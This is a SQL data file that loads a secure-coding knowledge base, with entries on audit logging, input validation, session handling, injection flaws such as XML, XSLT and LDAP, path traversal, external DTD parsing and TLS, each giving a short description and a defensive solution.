INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Audit logsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEAn audit trail (also called audit log) is a security-relevant chronological record,NEWLINEset of records, and/or destination and source of records that provide documentaryNEWLINEevidence of the sequence of activities that have affected at any time a specific operation,NEWLINEprocedure, or event.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEAn audit log should contain the following items:NEWLINENEWLINE-User idNEWLINE-OperationNEWLINE-Success/failure of the operationNEWLINE-PrivilegesNEWLINE-TimestampNEWLINENEWLINEDepending on the gravity of the users violation there should also be a record kept forNEWLINEeach user to lock their accounts after a certain number of violations. This should beNEWLINEapplied since we can now assume it is an attacker trying to compromise your application.NEWLINENEWLINEAlso when doing audit logs make sure you always do logging before action in case theNEWLINEaction is not properly processed or terminated by your application. When using thisNEWLINEapproach you are always in possession of an complete audit trail.NEWLINE', 'Audit logs'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# User credentials in audit logsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever there are user credentials supplied in an audit log,NEWLINEthis could become a risk whenever an attacker could gain access to one of these log files.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEInstead of storing user credentials, you may want to use user id''s in order toNEWLINEidentify the user in the log files.NEWLINENEWLINERecommended knowledge-base item:NEWLINENEWLINE- Logging guidelinesNEWLINE', 'User credentials in audit logs'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Intrusion detecting and reportingNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEAll possible attacks on your application should be detected an reported in order toNEWLINEprevent further escalation.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEIntrusion detecting could be done by means of a:NEWLINENEWLINE"Positive security model:"NEWLINEIn this model you create certain regular expressions in order to only make the applicationNEWLINEpass the so called "known good".NEWLINEWhenever an application detects strange behavior and anomalies,NEWLINEthese issues should be reported. Keep in mind whenever the application changes thisNEWLINEwhitelist method has to evolve alongside with it. A big con is it could generate a lotNEWLINEof reports and alerts.NEWLINENEWLINENEWLINE"Negative security model:"NEWLINECreate a blacklist with known attacks and malicious input and make the application reportNEWLINEon detection of this input. You could also prioritise different malicious input andNEWLINEclassify them into different groups.NEWLINENEWLINEWhatever method you may choose to prefer, you should always ensure error handling logic inNEWLINEsecurity controls denies access by default. With this approach applied you will have aNEWLINEhigher probability that whenever an attacker manages to break your applications intendedNEWLINEoperation, it will not fail in a way which increases his attack vector.NEWLINE', 'Intrusion detecting and reporting'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# XML injectionNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEXML Injection is an attack technique used to manipulate or compromise the logic of an XMLNEWLINEapplication or service. The injection of unintended XML content and/or structures intoNEWLINEan XML message can alter the intend logic of the application. Further, XML injectionNEWLINEcan cause the insertion of malicious content into the resulting message/document.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEIn addition to the existing input validation, define a positive approach whichNEWLINEescapes/encodes characters that can be interpreted as xml. At a minimum this includesNEWLINEthe following: < > / " ''NEWLINE', 'XML injection'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Authentication at a central locationNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEAuthentication should always be performed at a central location in the application inNEWLINEorder to prevent missing authentication on certain levels in the application.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEUse a central location for authentication. If u want to put extra constraints on theNEWLINEusers for accessing critical parts of your application you have to implementNEWLINEstep-up or adaptive authentication mechanisms.NEWLINENEWLINEVerify that alternative and less secure access paths do not exist.NEWLINE', 'Authentication at a central location'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# IP address in internal HTTP headersNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever IP addresses are used in HTTP headers in internal structures of your organization,NEWLINEan attacker could use these to enlarge his attack vector and recon yourNEWLINEinternal infrastructures.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINENever use IP addresses in internal HTTP headers.NEWLINE', 'IP adresses in internal HTTP headers'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Authentication enforced by the web-severNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEAuthentication should be enforced by the web-server. Whenever these configurations areNEWLINEnot enabled on the server an attacker could gain access to authorizedNEWLINEpages on your application.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEAlways make sure your web-server is correctly configured to enforce authentication,NEWLINEsuch as a session management implementation.NEWLINE', 'Authentication enforced by the web sever'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# The audit log must include a priority system.NEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEIf the audit log does not contain a clear priority system it will be difficult toNEWLINEprioritize different types of process failures.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEWhenever the web-application is writing error messages to the error log then these needNEWLINEto have a correct priority label. The labels that you can use are LOW, MEDIUM and HIGH.NEWLINEThese labels can then be used at a later moment in time for easy and quick analysingNEWLINEcapabilities of the log files.NEWLINENEWLINEYou should also verify security logging controls provide the ability to log success andNEWLINEparticularly failure events that are identified as security-relevant.NEWLINE', 'The audit log must include a priority system'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Servers must not be trusted without explicit authenticationNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever the server your web-application is connecting towards is not using any form ofNEWLINEexplicit authentication and is internet facing then this results into that the serverNEWLINEcannot be trusted. This is because the server can be potentially be owned and managed byNEWLINEeverybody including hackers.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEWhenever the web-application is facing the internet third parties trying toNEWLINEaccess it should always use a form of authentication in order to gain access.NEWLINE', 'Servers must not be trusted without explicit authentication'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Ensure overall securityNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINESome parts of the application at first sight might seem to acquire a higher level ofNEWLINEsecurity than i.e unauthorized/public parts of the application.NEWLINEThis however is not true since breaching public parts could also lead to an attackerNEWLINEcompromising the application or other users accounts.NEWLINENEWLINE## Solution:NEWLINENEWLINEAlways ensure full hardened security on all layers of the web application.NEWLINENEWLINERecommended knowledge-base item:NEWLINENEWLINE- High level architecture should be definedNEWLINE', 'Ensure overall security'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Re-authenticationNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever a user is changing credentials such as his password, the user should always beNEWLINEchallenged by the application to re-authenticate himself. This is in order to prevent anNEWLINEattacker to change credentials if ever an attacker could hijack another users session.NEWLINENEWLINEVerify that the changing password functionality includes the old password,NEWLINEthe new password, and a password confirmation, as well as a passphrase strength indicationNEWLINEto encourage the adoption of strong password phrases.  NEWLINENEWLINE## Solution:NEWLINENEWLINEA user should always be challenged by the application to re-authenticate themselves afterNEWLINEchanging their credentials, e-mail or doing other important data exchanges such asNEWLINEtransferring money. You could also consider using step up, adaptive authentication orNEWLINEtwo factor authentication, or transaction signing depending on how critical yourNEWLINEapplication is.NEWLINENEWLINERecommended knowledge base item:NEWLINENEWLINE- Step up or adaptive authenticationNEWLINE', 'Re authentication'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# No shared knowledge for secret questionsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever an application ask an user a secret question such as for i.e a password forgotNEWLINEfunctionality, these questions should not be shared knowledge an attacker could get fromNEWLINEthe web to prevent him compromising the account by this function.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINESecret questions should never include shared knowledge, predictable or easyNEWLINEguessable values.NEWLINE', 'No shared knowledge for secret questions'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Disallow the use of old passwordsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThis is a mitigation of the risk that a password can leak by any means towards a possible,NEWLINEattacker. By changing the password to a new one minimizes the damage.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEKeep the old entries of the password record of the user. If the user changes his passwordNEWLINEyou can match against the old entries to validate it is not an old one.NEWLINE', 'Disallow the use of old passwords'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Absolute session time-outNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEAll sessions should implement an absolute timeout, regardless of session activity.NEWLINEThis timeout defines the maximum amount of time a session can be active,NEWLINEclosing and invalidating the session upon the defined absolute period since the givenNEWLINEsession was initially created by the web application. After invalidating the session,NEWLINEthe user is forced to (re)authenticate again in the web application and establishNEWLINEa new session. The absolute session limits the amount of time an attacker can use aNEWLINEhijacked session and impersonate the victim user.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEAlways ensure that sessions absolute time-out server-side in order to decrease a hackersNEWLINEattack vector.NEWLINE', 'Absolute session time out'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# XSLT injectionsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThe vulnerability occurs when a XSL file is loaded from a source controlled by an attacker.NEWLINEWhen the attacker is given the opportunity to specify the source of the included XSL fileNEWLINEhe could include a file which contains malicious code to be parsed on the target application.NEWLINEThis could lead to, code execution, reading arbitrary files and many moreNEWLINEvulnerabilities such as XSS.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINETo protect against such vulnerability one needs to make sure that he does not useNEWLINEuser-supplied input in the XSL filename.NEWLINEThe best solution would be to define a list of permitted filenames andNEWLINEonly accept XSL filenames from that list.NEWLINE', 'XSLT injections'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Logout structuringNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEPlacing a logout link on every page that requires authentication helps the user end theNEWLINEsession when he is done with the site. Ending the session helps prevent hijacking.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEIdentify all pages that use authentication. Make a list of all pages on your site that useNEWLINEauthentication then verify the presence of logout links. Examine each page that usesNEWLINEauthentication to make sure it has a logout link in a location that can beNEWLINEfound intuitively.NEWLINE', 'Logout structuring'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Verify that the session id is never disclosedNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEIf the session id is disclosed in the URL the users session id can be easily obtained byNEWLINEan attacker and could leak through the referrer header towards other severs. Also wheneverNEWLINEthe session id is disclosed in the URL the possibility also arises to perform otherNEWLINEattacks like session fixation which could lead to session hijacking.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINESession id should never be included in places other than the application cookie header.NEWLINE', 'Verify that the session id is never disclosed'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Session cookies (Domain)NEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThe Domain option allows you to specify whether or not to send the cookie to subdomains.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINESetting www.example.com will mean only the exact domain www.example.com willNEWLINEbe matched, while .example.com (wildcard) will also match again anyNEWLINEsubdomain (forums.example.com, blog.example.com).NEWLINENEWLINEThe use of a wildcard is not recommended at all and should be avoided.NEWLINENEWLINEThere are a lot of different mitigations in order to harden your session management.NEWLINEThese mitigations are amongst others the setting of the "HttpOnly and secure" flags onNEWLINEyour sessions. Follow the "Sessions pattern" list to make sure your session management isNEWLINEsecure.NEWLINENEWLINERecommended knowledge base items:NEWLINENEWLINE- Cross subdomain cookie attacksNEWLINE- Sessions patternNEWLINE', 'Session Domain cookies'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Access control failureNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEHandling errors securely is a key aspect of secure coding. There are two types of errorsNEWLINEthat deserve special attention. The first is exceptions that occur in the processing of aNEWLINEsecurity control itself. It is important that these exceptions do not enable behaviourNEWLINEthat the countermeasures would normally not allow. As a developer, you should considerNEWLINEthat there are generally three possible outcomes from a securityNEWLINEmechanism: allow the operation, disallow the operation, exception In general.NEWLINEYou should design your security mechanism so that a failure will follow the sameNEWLINEexecution path as disallowing the operation.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINESecurity methods like isAuthorized(), isAuthenticated(), and validate() should all returnNEWLINEfalse if there is an exception during processing.NEWLINEIf security controls can throw exceptions, they must be very clear about exactly what thatNEWLINEcondition means.NEWLINE', 'Access control failure'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Input rejectionNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever the application detects malicious or unexpected user-input you want to make sureNEWLINEthe application actual rejects the submitted user-input rather than directly process it.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that the application actually rejects the user requests whenever malicious inputNEWLINEis detected by your application. The base of this process will be checking the applicationNEWLINEfor expected user-input, for example: Whenever the user is filling in a form whichNEWLINEcontains a checkbox, there are fixed values which your application can expect fromNEWLINEthe user to return. Whenever this value differs from what the application served the userNEWLINEas possible answers, you can assume the request was corrupted and you reject the request.NEWLINENEWLINEYou must also keep track of the users movements by adding an audit trail as well as anNEWLINEcounter for tracking the number of his violations(submitting bad input) in your inputNEWLINEvalidation class. You should enforce a lockout whenever a unreasonable number ofNEWLINEviolations are detected by your application in order to protect it from attackers.NEWLINENEWLINERecommended knowledge base items:NEWLINENEWLINE- Input validationNEWLINE- Client side input validationNEWLINE- Single input validation controlsNEWLINE- Character encodingNEWLINE', 'Input rejection'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Input validationNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINETo ensure that the application is robust against all forms of input data, this data shouldNEWLINEbe sanitized and/or encoded server-side since an attacker could otherwise easy bypassNEWLINEthese checks with an intercepting proxy.NEWLINENEWLINE## Solution:NEWLINENEWLINEAll input validation and encoding-routines should be implemented on the server-sideNEWLINEoutside the reach of an attacker. Just as with the input rejection you should make sure thatNEWLINEafter validating the user-input, whenever the input is bad it actually rejects, sanitizesNEWLINEor formats your user-input into not malicious data.NEWLINENEWLINEThe recommended method for validating user input would be the positive validation method.NEWLINEWhite-list input validation means allowing only input that is explicitly defined as valid,NEWLINEas opposed to black-list input validation, which filters out known bad input.NEWLINENEWLINEYou must also keep track of the users movements by adding an audit trail as well as anNEWLINEcounter for tracking the number of his violations(submitting bad input) in your inputNEWLINEvalidation class. You should enforce a lockout whenever a unreasonable number ofNEWLINEviolations are detected by your application in order to protect it from attackers.NEWLINENEWLINEAlso verify that structured data is strongly typed and validated against a defined schemaNEWLINEincluding allowed characters, length and pattern (e.g. credit card numbers or telephone,NEWLINEor validating that two related fields are reasonable, such as validating suburbs and zipNEWLINEor post codes match).NEWLINENEWLINEThis also goes for whenever you are expecting just an integer or alphanumeric values etc.NEWLINEEvery detection of input outside of the intended operation of the application should beNEWLINElogged and rejected by your application.NEWLINENEWLINENote: All this validation and rejection should always be performed on the server side.NEWLINENEWLINERecommended knowledge base items:NEWLINENEWLINE- Positive validation methodNEWLINE- Input rejectionNEWLINE- Client side validationNEWLINE- Single input validation controlsNEWLINE', 'Input validation'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Single input validation controlsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEInput validation refers to the process of validating all the input to an applicationNEWLINEbefore using it. Input validation is absolutely critical to application security,NEWLINEand most application risks involve tainted input at some level.NEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that a single input validation control is used by the application for eachNEWLINEtype of data that is accepted. This way your validation controls stay clear, transparentNEWLINEand manageable. This method leaves less room for error.NEWLINENEWLINERecommended knowledge base items:NEWLINENEWLINE- Positive validation methodNEWLINE- Input validationNEWLINE- Input rejectionNEWLINE- Client side input validationNEWLINE- Character encodingNEWLINE', 'Single input validation controls'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Logging validation failuresNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhen you log all the input validation failures in your application you can discover in anNEWLINEearly stage that your application is under attack and take quick countermeasures againstNEWLINEthe attackers.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that all input validation failures are logged in order to counter possible attacksNEWLINEin an early stage. Also you want to verify that error handling logic in security controlsNEWLINEdenies access by default.NEWLINE', 'Logging validation failures'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Logging implemented on the server-sideNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINELogging should always be implemented on the server-side since an attacker otherwise NEWLINEmanipulate the functionality and erase his traces.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that all logging controls are implemented on the server-side.NEWLINE', 'Logging implemented on the serverside'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Logging guidelinesNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThe logging should contain some guidelines in order to organize your logging file in suchNEWLINEa way it becomes clear and easy to find informationNEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThe logging file should at least contain, a timestamp from a reliable source, severityNEWLINElevel of the event, an indication that this is a security relevant eventNEWLINE(if mixed with other logs), the identity of the user that caused the eventNEWLINE(if there is a user associated with the event), the source IP address of the requestNEWLINEassociated with the event, whether the event succeeded or failed, and aNEWLINEdescription of the event. Also verify that log fields from trusted and untrusted sourcesNEWLINEare distinguishable in log entries, preferably stored in different files so they cannotNEWLINEtaint each other whenever log injection occurs.NEWLINENEWLINEVerify accessing sensitive data is logged, if the data is collected under relevant data protectionNEWLINEdirectives or where logging of accesses is required.NEWLINE', 'Logging guidelines'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('Not available itemNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThis item is currently not available.NEWLINENEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThis item is currently not available.NEWLINE', 'not available item'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Filename Injection / Path TraversalNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEA Path Traversal attack aims to access files and directories that are stored outsideNEWLINEthe web root folder. By browsing the application, the attacker looks for absolute linksNEWLINEto files stored on the web server.  By manipulating variables that reference files withNEWLINEdot-dot-slash (../); sequences and its variations, it may be possible to access arbitraryNEWLINEfiles and directories stored on file system, including application source code,configurationNEWLINEand critical system files, limited by system operational access control.NEWLINENEWLINEThe attacker uses ../../ sequences to move up to root directory, thus permitting navigationNEWLINEthrough the file system. This attack can be executed with an external malicious code injectedNEWLINEon the path, like the Resource Injection attack.NEWLINENEWLINE## Solution:NEWLINENEWLINEThe most effective solution to eliminate file inclusion vulnerabilities is to avoid passingNEWLINEuser-submitted input to any filesystem/framework API. If this is not possible the applicationNEWLINEcan maintain a white list of files, that may be included by the page, and then use an identifierNEWLINE(for example the index number) to access to the selected file. Any request containing an invalidNEWLINEidentifier has to be rejected, in this way there is no attack surface for malicious users toNEWLINEmanipulate the path.NEWLINE', 'Filename injection Path traversel'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# External DTD parsingNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEProcessing of an external entity containing tainted data may lead to disclosure ofNEWLINEconfidential information and other system impacts.NEWLINEThe XML 1.0 standard defines the structure of an XML document.NEWLINEThe standard defines a concept called an entity, which is a storage unit of some type.NEWLINEThere exists a specific type of entity, an external general parsed entity often shortenedNEWLINEto an external entity, that can access local or remote content via a declared systemNEWLINEidentifier. The system identifier is assumed to be a URI that can be dereferencedNEWLINE(accessed) by the XML processor when processing the entity.NEWLINENEWLINEThe XML processor thenNEWLINEreplaces occurrences of the named external entity with the contents dereferenced by theNEWLINEsystem identifier. If the system identifier contains tainted data and the XML processorNEWLINEdereferences this tainted data, the XML processor may disclose confidential informationNEWLINEnormally not accessible by the application. Attacks can include disclosing local files,NEWLINEwhich may contain sensitive data such as passwords or private user data,NEWLINEusing file: schemes or relative paths in the system identifier.NEWLINENEWLINESince the attack occurs relative to the application processing the XML document,NEWLINEan attacker may use this trusted application to pivot to other internal systems,NEWLINEpossibly disclosing other internal contentNEWLINEvia http(s) requests. In some situations, an XML processor library that is vulnerableNEWLINEto client-side memory corruption issues may be exploited by dereferencing a malicious URI,NEWLINEpossibly allowing arbitrary code execution under the application account. Other attacksNEWLINEcan access local resources that may not stop returning data, possibly impacting applicationNEWLINEavailability if too many threads or processes are not released.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEDisable the XML DTD parsing. This can be set when initiating the XML parser.NEWLINE', 'External DTD parsing'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Log injectionNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINELog injection problems are a subset of injection problem, in which invalid entries takenNEWLINEfrom user input are inserted in logs or audit trails, allowing an attacker to misleadNEWLINEadministrators or cover traces of attack. Log injection can also sometimes be used toNEWLINEattack log monitoring systems indirectly by injecting data that monitoring systems willNEWLINEmisinterpret.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEYou should consider these three controls when implementing logging systems.NEWLINENEWLINE- Design: If at all possible, avoid logging data that came from external inputs.NEWLINENEWLINE- Implementation: Ensure that all log entries are statically created, or if they mustNEWLINErecord external data that the input is vigorously white-list checked.NEWLINENEWLINE- Run time: Avoid viewing logs with tools that may interpret control characters in theNEWLINEfile, such as command-line shells.NEWLINENEWLINEAlso verify that all non-printable symbols and field separators are properly encoded in log entries,NEWLINEto prevent log injection.NEWLINE', 'Log injection'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# CA certificatesNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEIn cryptography, a certificate authority or certification authority (CA) is an entity thatNEWLINEissues digital certificates. A digital certificate certifies the ownership of a public keyNEWLINEby the named subject of the certificate. Sometimes it happens that a CA goes bad and isNEWLINErevoked from the browser. This will lead to untrusted TLS connections if your applicationNEWLINEuses an issued certificate from this CA.NEWLINENEWLINE## Solution:NEWLINENEWLINEIt''s always a good idea to let multiple CA you trust create a certificate,NEWLINEbest way is that you create yourself the key pair (pub & priv) and let the CA sign it.NEWLINEThis way you don''t need to ''leak'' your priv key and you have backup trustedNEWLINEcertificates you can use as a backup when one goes ''bad''.NEWLINE', 'CA certificates'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# All connections should be TLSNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever an application provides TLS, all connections should be TLS otherwise theNEWLINEencryption will be lost.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that TLS is used for all connectionsNEWLINE(including both external and backend connections) that are using authentication tokens orNEWLINEthat involve sensitive data or functions.NEWLINEThis should also be enforced in the application itself wherever possible,NEWLINEfor example: Secure flags on cookies, HSTS, certificate pinning etc.NEWLINE', 'All connections should be TLS'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Log TLS connection failuresNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEFailing TLS connections should always be logged. This is a great indicator that ''something'' is wrong.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that backend TLS connection failures are logged.NEWLINE', 'Log TLS connection failures'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Content type headersNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINESetting the right content headers is important for hardening your applications security,NEWLINEthis reduces exposure to drive-by download attacks or sites serving user uploadedNEWLINEcontent that, by clever naming could be treated by MS Internet Explorer as executable orNEWLINEdynamic HTML files and thus can lead to security vulnerabilities.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEAn example of a content type header would be:  NEWLINENEWLINE    Content-Type: text/html; charset=UTF-8NEWLINE    or:NEWLINE    Content-Type: application/json;NEWLINE', 'Content type headers'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Malicious intentNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEBefore pushing a code live you should check the software for malicious code in order toNEWLINEmake sure no developers with evil intent made backdoors or deliberately put in exploits.NEWLINEThe same goes for whenever you are using third-part software and components.NEWLINENEWLINEAlso verify, that third party components come from trusted repositories.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINERunning your code through a static code analyzer or auditing tools could give you a changeNEWLINEto find malicious pieces of code which could be embedded into the software.NEWLINEAlso if the new or adjusted functionality is critical then check manually it in the formNEWLINEof a code review for back doors, Easter eggs, and logic flaws.NEWLINENEWLINEThis should also mean that authorized administrators must have the capability to verify the integrity ofNEWLINEall security-relevant configurations to ensure that they have not been tampered with.NEWLINE', 'Malicious intent'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# SandboxingNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEA sandbox is a security mechanism for separating running programs.NEWLINEIt is often used to execute untested code, or untrusted programs fromNEWLINEunverified third parties, suppliers, untrusted users and untrusted websites. It''s creatingNEWLINEan extra layer of security where an attacker first need to break out from.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEUse the sandbox attribute of an iframe for untrusted content. The sandbox attribute of anNEWLINEiframe enables restrictions on content within a iframe. The following restrictions areNEWLINENEWLINEActive when the sandbox attribute is set:NEWLINENEWLINE- All markup is treated as being from a unique originNEWLINE- All forms and scripts are disabled.NEWLINE- All links are prevented from targeting other browsing contextsNEWLINE- All features that triggers automatically are blockedNEWLINE- All plugins are disabledNEWLINENEWLINEIt is possible to have a fine-grained control over iframe capabilities using the value ofNEWLINEthe sandbox attribute. In old versions of user agents where this feature is not supported,NEWLINEthis attribute will be ignored. Use this feature as an additional layer of protection orNEWLINEcheck if the browser supports sandboxed frames and only show the untrustedNEWLINEcontent if supported. Apart from this attribute, to prevent Clickjacking attacks andNEWLINEunsolicited framing it is encouraged to use the header X-Frame-Options which supportsNEWLINEthe deny and same-origin values. Other solutions like framebusting:NEWLINENEWLINE```javascriptNEWLINEif(window!== window.top) { window.top.location = location; }NEWLINE#Only for legacy browser supportNEWLINE```NEWLINE', 'Sandboxing'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Repudiation attackNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEA repudiation attack happens when an application or system does not adopt controls toNEWLINEproperly track and log users actions, thus permitting malicious manipulation or forgingNEWLINEthe identification of new actions. This attack can be used to change the authoringNEWLINEinformation of actions executed by a malicious user in order to log wrong data to log files.NEWLINEIts usage can be extended to general data manipulation in the name of others,NEWLINEin a similar manner as spoofing mail messages. If this attack takes place, the data storedNEWLINEon log files can be considered invalid or misleading.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThis type of data should always be processed out of reach of the user and should beNEWLINEverified and enforced server-side.NEWLINE', 'Repudiation attack'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Server-side validationNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever the application is processing high value business logic parameters these valuesNEWLINEshould always be processed out of reach of the users and validated against expectedNEWLINEvalues on the server.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify the application does not allow high value business logic parameters to beNEWLINEtampered with. The users should not be able to have control over this value, recommendedNEWLINEis to process this data server-side and validate the data to see if it returns expectedNEWLINEvalues. If not these failures should be logged.NEWLINENEWLINEAlso important to always verify that the same access control rules implied by the presentation layerNEWLINEare enforced on the server-side.NEWLINENEWLINERecommended knowledge base items:NEWLINENEWLINE- Input validationNEWLINE- Input rejectionNEWLINE- Single input validation classNEWLINE- Character encodingNEWLINE- Client side input validationNEWLINE', 'Server side validation'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Privilege escalationNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEIn every portion of the application where a user can create information in the databaseNEWLINE(e.g., making a payment, adding a contact, or sending a message), then he can receiveNEWLINEinformation (statement of account, order details, etc.), or delete informationNEWLINE(drop users, messages, etc.), it is necessary to record that functionality.NEWLINEThe tester should try to access such functions as another user in order to verify if it isNEWLINEpossible to access a function that should not be permitted by the users role/privilegeNEWLINE(but might be permitted as another user).NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEChecking if a user has enough authorization to execute certain request should always beNEWLINEenforced on the server-side. Also you may to apply the Principle of Least privilege,NEWLINEthe principle of least privilege recommends that accounts have the least amount ofNEWLINEprivilege required to perform their business processes. This encompasses user rights,NEWLINEresource permissions such as CPU limits, memory, network, and file system permissions.NEWLINEFor example, if a user server only requires access to the network, read access to aNEWLINEdatabase table, and the ability to write to a log, this describes all the permissionsNEWLINEthat should be granted. Under no circumstances should the user be granted administrativeNEWLINEprivileges. Also for making testing easier you can create Unit-tests that verifies theNEWLINEuser role permissions.NEWLINE', 'Privilege escalation'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# LDAP injectionNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINELDAP Injection is an attack used to exploit web based applications thatNEWLINEconstruct LDAP statements based on user input. When an application fails to properlyNEWLINEsanitise user input, it is possible to modify LDAP statements using a local proxy.NEWLINEThis could result in the execution of arbitrary commands such as granting permissions toNEWLINEunauthorised queries, and content modification inside the LDAP tree.NEWLINEThe same advanced exploitation techniques available in SQL Injection can be similarlyNEWLINEapplied in LDAP Injection.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThe best way to prevent LDAP injection is to use a positive validation scheme for ensuringNEWLINEthat the data going into your queries does not contain any attacks. However, in some cases,NEWLINEit is necessary to include special characters in input that is passed into an LDAP query.NEWLINEIn this case, using escaping can prevent the LDAP interpreter from thinking those specialNEWLINEcharacters are actually LDAP query.NEWLINE', 'LDAP injection'); 
